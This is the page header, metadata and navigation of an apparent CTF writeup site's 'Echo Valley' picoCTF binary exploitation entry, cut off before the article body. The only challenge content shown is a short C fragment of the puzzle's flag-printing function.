<!doctype html><html lang=en data-bs-theme=dark><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1"><link rel=preload href=/fonts/vendor/jost/jost-v4-latin-regular.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/vendor/jost/jost-v4-latin-500.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/vendor/jost/jost-v4-latin-700.woff2 as=font type=font/woff2 crossorigin><script src=/js/dismissable-alert.ecfe60f33522da00acae2a7c5195ae0237f6bf736d4c295a83700bdbcb4d0263.js integrity="sha256-7P5g8zUi2gCsrip8UZWuAjf2v3NtTClag3AL28tNAmM="></script><link rel=stylesheet href="/main.3a19445c3174e55464794f8d7b5c581d8dcdee797f74e5cbe6f59a3562e0e99186e34e57cc7c5c589d66ce9e1590c410c896d88822c3e063309dfea0fc07631f.css" integrity="sha512-OhlEXDF05VRkeU+Ne1xYHY3N7nl/dOXL5vWaNWLg6ZGG405XzHxcWJ1mzp4VkMQQyJbYiCLD4GMwnf6g/AdjHw==" crossorigin=anonymous><noscript><style>img.lazyload{display:none}</style></noscript><link rel=canonical href=/ctf/picoctf/binaryexplotation/echovalley/><title>Echo Valley | d3bo</title><meta name=description content><meta property="og:title" content="Echo Valley"><meta property="og:description" content="#include <stdio.h> #include <stdlib.h> #include <string.h> void print_flag() { char buf[32]; FILE *file = fopen(&#34;/home/valley/flag.txt&#34;, &#34;r&#34;); if (file == NULL) { perror(&#34;Failed to open flag file&#34;); exit(EXIT_FAILURE); } fgets(buf, sizeof(buf), file); printf(&#34;Congrats!"><meta property="og:type" content="article"><meta property="og:url" content="/ctf/picoctf/binaryexplotation/echovalley/"><meta property="og:image" content="/ctf/picoctf/binaryexplotation/echovalley/cover.png"><meta property="article:section" content="ctf"><meta property="article:published_time" content="2025-07-18T00:00:00+00:00"><meta property="article:modified_time" content="2025-07-18T00:00:00+00:00"><meta property="og:site_name" content="d3b0o"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/ctf/picoctf/binaryexplotation/echovalley/cover.png"><meta name=twitter:title content="Echo Valley"><meta name=twitter:description content="#include <stdio.h> #include <stdlib.h> #include <string.h> void print_flag() { char buf[32]; FILE *file = fopen(&#34;/home/valley/flag.txt&#34;, &#34;r&#34;); if (file == NULL) { perror(&#34;Failed to open flag file&#34;); exit(EXIT_FAILURE); } fgets(buf, sizeof(buf), file); printf(&#34;Congrats!"><meta name=twitter:site content="@getdoks"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","item":"/","name":"D3bo","position":1},{"@type":"ListItem","item":"/ctf/","name":"Ctf's","position":2},{"@type":"ListItem","item":"/ctf/picoctf/","name":"Pico Ctf","position":3},{"@type":"ListItem","item":"/ctf/picoctf/binaryexplotation/","name":"Binary Explotation","position":4},{"@type":"ListItem","name":"Echo Valley","position":5}]}</script><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap"><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1877012045454778" crossorigin=anonymous></script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-850CS210Y8"></script>
<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-850CS210Y8")</script></head><body class="single section ctf" data-bs-spy=scroll data-bs-target=#toc data-bs-root-margin="0px 0px -60%" data-bs-smooth-scroll=true tabindex=0><div id=vanta-bg style=position:absolute;width:100%;height:100%;z-index:-1></div><div id=announcement data-id=global-alert-ed321576fabf52d76f925272710cb364 class="alert alert-primary alert-dismissible fade show text-center" role=alert><span class=alert-text>¡Nuevo writeup de la máquina "<a href=/writeups/hackthebox/unobtainium>Unobtainium</a>" de HackTheBox!</span>
<button type=button class=btn-close data-bs-dismiss=alert aria-label=Close></button></div><div class=sticky-top><div class=header-bar></div><header class="navbar navbar-expand-lg"><div class=container-lg><a class="navbar-brand me-auto me-lg-3" href=/>d3bo</a>
<button type=button id=searchToggleMobile class="btn btn-link nav-link mx-2 d-lg-none" aria-label="Search website"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg></button>
<button class="btn btn-link d-lg-none" type=button data-bs-toggle=offcanvas data-bs-target=#offcanvasNavSection aria-controls=offcanvasNavSection aria-label="Open section navigation menu"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-dots-vertical" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 12m-1 0a1 1 0 102 0 1 1 0 10-2 0"/><path d="M12 19m-1 0a1 1 0 102 0 1 1 0 10-2 0"/><path d="M12 5m-1 0a1 1 0 102 0 1 1 0 10-2 0"/></svg></button><div class="offcanvas offcanvas-start d-lg-none" tabindex=-1 id=offcanvasNavSection aria-labelledby=offcanvasNavSectionLabel><div class=header-bar></div><div class=offcanvas-header><h5 class=offcanvas-title id=offcanvasNavSectionLabel>Ctf</h5><button type=button class="btn btn-link nav-link p-0" data-bs-dismiss=offcanvas aria-label=Close><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg></button></div><div class=offcanvas-body><aside class="doks-sidebar mt-n3"><nav id=doks-docs-nav aria-label="Tertiary navigation"><ul class="list-unstyled collapsible-sidebar"><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-1cad35d4b3b9f624f82dbf237daaf188 aria-expanded=false>
Intro</button><div class=collapse id=section-1cad35d4b3b9f624f82dbf237daaf188><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/intro/bienvenido/><img src=/ctf/intro/bienvenido//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Bienvenido</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-55c76aa40643ba5854bd47d052d6cd3d aria-expanded=false>
CaixaBank</button><div class=collapse id=section-55c76aa40643ba5854bd47d052d6cd3d><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li class="my-1 ms-3"><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-07811dc6c422334ce36a09ff5cd6fe71 aria-expanded=false>
2024</button><div class=collapse id=section-07811dc6c422334ce36a09ff5cd6fe71><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"></ul></div></li><li class="my-1 ms-3"><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-312351bff07989769097660a56395065 aria-expanded=false>
2025</button><div class=collapse id=section-312351bff07989769097660a56395065><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/caixabank/2025/202507/>Reto 07</a></li></ul></div></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-8c526cb24566db1d06d0df2aa2517c84 aria-expanded=false>
FCSC</button><div class=collapse id=section-8c526cb24566db1d06d0df2aa2517c84><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li class="my-1 ms-3"><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-05a5cf06982ba7892ed2a6d38fe832d6 aria-expanded=false>
2021</button><div class=collapse id=section-05a5cf06982ba7892ed2a6d38fe832d6><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/fcsc/2021/bofbof/>bofbof</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/fcsc/2021/bonuspoints/>Bonus Points</a></li></ul></div></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-d9fb08be3ed131369df5d4aa808dac70 aria-expanded=false>
HackTheBox</button><div class=collapse id=section-d9fb08be3ed131369df5d4aa808dac70><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li class="my-1 ms-3"><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-643b24eb9ab148b2d7012dcd4f0df582 aria-expanded=false>
Binary Exploitation</button><div class=collapse id=section-643b24eb9ab148b2d7012dcd4f0df582><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/hackthebox/pwn/execute/>Execute</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/hackthebox/pwn/restaurant/>Restaurant</a></li></ul></div></li><li class="my-1 ms-3"><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-3c02a379965ab0dfcd77b1c484450433 aria-expanded=false>
Hardware</button><div class=collapse id=section-3c02a379965ab0dfcd77b1c484450433><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/hackthebox/hardware/debugging-interface/>Debugging Interface</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/hackthebox/hardware/the-needle/>The Needle</a></li></ul></div></li><li class="my-1 ms-3"><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-c6e190b284633c48e39e55049da3cce8 aria-expanded=false>
Web</button><div class=collapse id=section-c6e190b284633c48e39e55049da3cce8><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/hackthebox/web/pdfy/>PDFy</a></li></ul></div></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-df813460c79d124cbe4f69630e29ebb6 aria-expanded=false>
No Hack No CTF</button><div class=collapse id=section-df813460c79d124cbe4f69630e29ebb6><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/nohacknoctf/binaryexploitation/babyrop01/>babyrop</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/nohacknoctf/binaryexploitation/server_status/>Server Status</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-ed7102c6dc453239643d2f732016e4e2 aria-expanded=true>
PicoCTF</button><div class="collapse show" id=section-ed7102c6dc453239643d2f732016e4e2><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li class="my-1 ms-3"><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-10cdbc711ee428cd55410fe139ed0317 aria-expanded=true>
Binary Explotation</button><div class="collapse show" id=section-10cdbc711ee428cd55410fe139ed0317><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/babygame01/>babygame01</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/bof1/>Buffer Overflow 1</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded active" href=/ctf/picoctf/binaryexplotation/echovalley/>Echo Valley</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/flag_leak/>Flag Leak</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/format-strings-1/>Format strings 1</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/format-strings-2/>Format strings 2</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/format-strings-3/>Format strings 3</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/heap-0/>Heap 0</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/heap1/>Heap 1</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/heap3/>Heap 3</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/heres_a_libc/>Here's a LIBC</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/hijacking/>Hijacking</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/pickeriv/>Picker IV</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/ropfu/>ropfu</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/rps/>RPS</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/stonks/>Stonks</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/two-sum/>two-sum</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/vne/>VNE</a></li></ul></div></li></ul></div></li></ul></nav></aside></div></div><button class="btn btn-link nav-link mx-2 order-3 d-lg-none" type=button data-bs-toggle=offcanvas data-bs-target=#offcanvasNavMain aria-controls=offcanvasNavMain aria-label="Open main navigation menu"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-menu" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><line x1="4" y1="8" x2="20" y2="8"/><line x1="4" y1="16" x2="20" y2="16"/></svg></button><div class="offcanvas offcanvas-end h-auto" tabindex=-1 id=offcanvasNavMain aria-labelledby=offcanvasNavMainLabel><div class="header-bar d-lg-none"></div><div class=offcanvas-header><h5 class=offcanvas-title id=offcanvasNavMainLabel>d3bo</h5><button type=button class="btn btn-link nav-link p-0" data-bs-dismiss=offcanvas aria-label=Close><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg></button></div><div class="offcanvas-body d-flex flex-column flex-lg-row justify-content-between"><ul class="navbar-nav flex-grow-1"><li class=nav-item><a class=nav-link href=/blog/>Blog</a></li><li class=nav-item><a class=nav-link href=/writeups/intro/bienvenido/>Writeups</a></li><li class=nav-item><a class=nav-link href=/ctf/intro/bienvenido/>CTF</a></li><li class=nav-item><a class=nav-link href=/archive/>Archive</a></li></ul><button type=button id=searchToggleDesktop class="btn btn-link nav-link p-2 d-none d-lg-block" aria-label="Search website"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg></button><ul id=socialMenu class="nav mx-auto flex-row order-lg-4"><li class=nav-item><a class="nav-link social-link" href=https://x.com/sr_d3b0o><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 4l11.733 16H20L8.267 4z"/><path d="M4 20l6.768-6.768m2.46-2.46L20 4"/></svg><small class="ms-2 visually-hidden">Twitter</small></a></li><li class=nav-item><a class="nav-link social-link" href=https://github.com/d3b0o><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg><small class="ms-2 visually-hidden">GitHub</small></a></li></ul><a class="btn btn-primary rounded-pill mt-2 btn-block d-lg-none" href=https://www.buymeacoffee.com/d3b0o role=button>Support</a></div></div><a class="btn btn-primary rounded-pill ms-3 me-2 px-4 order-lg-3 d-none d-lg-block" href=https://www.buymeacoffee.com/d3b0o role=button>Support</a></div></header></div><div class=modal id=searchModal tabindex=-1 aria-labelledby=searchModalLabel aria-hidden=true><div class="modal-dialog modal-dialog-scrollable modal-fullscreen-md-down"><div class=modal-content><div class=modal-header><h1 class="modal-title fs-5 visually-hidden" id=searchModalLabel>Search</h1><button type=button class="btn-close visually-hidden" data-bs-dismiss=modal aria-label=Close></button><div class="search-input flex-grow-1 d-none"><form id=search-form class=search-form action=# method=post accept-charset=utf-8 role=search><label for=query class=visually-hidden>Search</label><div class=d-flex><input type=search id=query name=query class="search-text form-control form-control-lg" placeholder=Search aria-label=Search maxlength=128 autocomplete=off>
<button type=button class="btn btn-link text-decoration-none px-0 ms-3 d-md-none" data-bs-dismiss=modal aria-label=Close>Cancel</button></div></form></div></div><div class=modal-body><p class="search-loading status message d-none mt-3 text-center">Loading search index…</p><p class="search-no-recent message d-none mt-3 text-center">No recent searches</p><p class="search-no-results message d-none mt-3 text-center">No results for "<strong><span class=query-no-results>Query here</span></strong>"</p><div id=searchResults class=search-results></div><template><article class="search-result list-view"><div class="card my-3"><div class=card-body><header><h2 class="h5 title title-submitted mb-0"><a class="stretched-link text-decoration-none text-reset" href=#>Title here</a></h2><div class=submitted><time class=created-date>Date here</time></div></header><div class="content d-none">Summary here</div></div></div></article></template></div><div class=modal-footer><ul class="list-inline me-auto d-none d-md-block"><li class=list-inline-item><kbd class=me-2><svg width="15" height="15" aria-label="Enter key" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M12 3.53088v3c0 1-1 2-2 2H4m3 3-3-3 3-3"/></g></svg></kbd><span class=DocSearch-Label>to select</span></li><li class=list-inline-item><kbd class=me-2><svg width="15" height="15" aria-label="Arrow down" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 3.5v8m3-3-3 3-3-3"/></g></svg></kbd><kbd class=me-2><svg width="15" height="15" aria-label="Arrow up" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 11.5v-8m3 3-3-3-3 3"/></g></svg></kbd><span class=DocSearch-Label>to navigate</span></li><li class=list-inline-item><kbd class=me-2><svg width="15" height="15" aria-label="Escape key" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M13.6167 8.936c-.1065.3583-.6883.962-1.4875.962-.7993.0-1.653-.9165-1.653-2.1258v-.5678c0-1.2548.7896-2.1016 1.653-2.1016s1.3601.4778 1.4875 1.0724M9 6c-.1352-.4735-.7506-.9219-1.46-.8972-.7092.0246-1.344.57-1.344 1.2166s.4198.8812 1.3445.9805C8.465 7.3992 8.968 7.9337 9 8.5s-.454 1.398-1.4595 1.398C6.6593 9.898 6 9 5.963 8.4851m-1.4748.5368c-.2635.5941-.8099.876-1.5443.876s-1.7073-.6248-1.7073-2.204v-.4603c0-1.0416.721-2.131 1.7073-2.131.9864.0 1.6425 1.031 1.5443 2.2492h-2.956"/></g></svg></kbd><span class=DocSearch-Label>to close</span></li></ul><p class=d-md-none>Search by <a class=text-decoration-none href=https://github.com/nextapps-de/flexsearch>FlexSearch</a></p></div></div></div></div><div class="wrap container-lg" role=document><div class=content><div class="row flex-xl-nowrap"><div class="col-lg-5 col-xl-4 docs-sidebar docs-sidebar-offset d-none d-lg-block"><nav class=docs-links aria-label="Main navigation"><ul class="list-unstyled collapsible-sidebar"><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-1cad35d4b3b9f624f82dbf237daaf188 aria-expanded=false>
Intro</button><div class=collapse id=section-1cad35d4b3b9f624f82dbf237daaf188><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/intro/bienvenido/><img src=/ctf/intro/bienvenido//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Bienvenido</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-55c76aa40643ba5854bd47d052d6cd3d aria-expanded=false>
CaixaBank</button><div class=collapse id=section-55c76aa40643ba5854bd47d052d6cd3d><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li class="my-1 ms-3"><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-07811dc6c422334ce36a09ff5cd6fe71 aria-expanded=false>
2024</button><div class=collapse id=section-07811dc6c422334ce36a09ff5cd6fe71><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"></ul></div></li><li class="my-1 ms-3"><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-312351bff07989769097660a56395065 aria-expanded=false>
2025</button><div class=collapse id=section-312351bff07989769097660a56395065><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/caixabank/2025/202507/>Reto 07</a></li></ul></div></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-8c526cb24566db1d06d0df2aa2517c84 aria-expanded=false>
FCSC</button><div class=collapse id=section-8c526cb24566db1d06d0df2aa2517c84><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li class="my-1 ms-3"><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-05a5cf06982ba7892ed2a6d38fe832d6 aria-expanded=false>
2021</button><div class=collapse id=section-05a5cf06982ba7892ed2a6d38fe832d6><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/fcsc/2021/bofbof/>bofbof</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/fcsc/2021/bonuspoints/>Bonus Points</a></li></ul></div></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-d9fb08be3ed131369df5d4aa808dac70 aria-expanded=false>
HackTheBox</button><div class=collapse id=section-d9fb08be3ed131369df5d4aa808dac70><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li class="my-1 ms-3"><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-643b24eb9ab148b2d7012dcd4f0df582 aria-expanded=false>
Binary Exploitation</button><div class=collapse id=section-643b24eb9ab148b2d7012dcd4f0df582><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/hackthebox/pwn/execute/>Execute</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/hackthebox/pwn/restaurant/>Restaurant</a></li></ul></div></li><li class="my-1 ms-3"><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-3c02a379965ab0dfcd77b1c484450433 aria-expanded=false>
Hardware</button><div class=collapse id=section-3c02a379965ab0dfcd77b1c484450433><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/hackthebox/hardware/debugging-interface/>Debugging Interface</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/hackthebox/hardware/the-needle/>The Needle</a></li></ul></div></li><li class="my-1 ms-3"><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-c6e190b284633c48e39e55049da3cce8 aria-expanded=false>
Web</button><div class=collapse id=section-c6e190b284633c48e39e55049da3cce8><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/hackthebox/web/pdfy/>PDFy</a></li></ul></div></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-df813460c79d124cbe4f69630e29ebb6 aria-expanded=false>
No Hack No CTF</button><div class=collapse id=section-df813460c79d124cbe4f69630e29ebb6><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/nohacknoctf/binaryexploitation/babyrop01/>babyrop</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/nohacknoctf/binaryexploitation/server_status/>Server Status</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-ed7102c6dc453239643d2f732016e4e2 aria-expanded=true>
PicoCTF</button><div class="collapse show" id=section-ed7102c6dc453239643d2f732016e4e2><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li class="my-1 ms-3"><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-10cdbc711ee428cd55410fe139ed0317 aria-expanded=true>
Binary Explotation</button><div class="collapse show" id=section-10cdbc711ee428cd55410fe139ed0317><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/babygame01/>babygame01</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/bof1/>Buffer Overflow 1</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded active" href=/ctf/picoctf/binaryexplotation/echovalley/>Echo Valley</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/flag_leak/>Flag Leak</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/format-strings-1/>Format strings 1</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/format-strings-2/>Format strings 2</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/format-strings-3/>Format strings 3</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/heap-0/>Heap 0</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/heap1/>Heap 1</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/heap3/>Heap 3</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/heres_a_libc/>Here's a LIBC</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/hijacking/>Hijacking</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/pickeriv/>Picker IV</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/ropfu/>ropfu</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/rps/>RPS</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/stonks/>Stonks</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/two-sum/>two-sum</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/vne/>VNE</a></li></ul></div></li></ul></div></li></ul></nav></div><nav class="docs-toc docs-toc-offset d-none d-xl-block col-xl-3" aria-label="Secondary navigation"><div class=page-links></div></nav><main class="docs-content col-lg-11 col-xl-9"><nav aria-label=breadcrumb><ol class=breadcrumb><li class=breadcrumb-item><a href=/>Home</a></li><li class=breadcrumb-item><a href=/ctf/>Ctf</a></li><li class=breadcrumb-item><a href=/ctf/picoctf/>PicoCTF</a></li><li class=breadcrumb-item><a href=/ctf/picoctf/binaryexplotation/>Binary Explotation</a></li><li 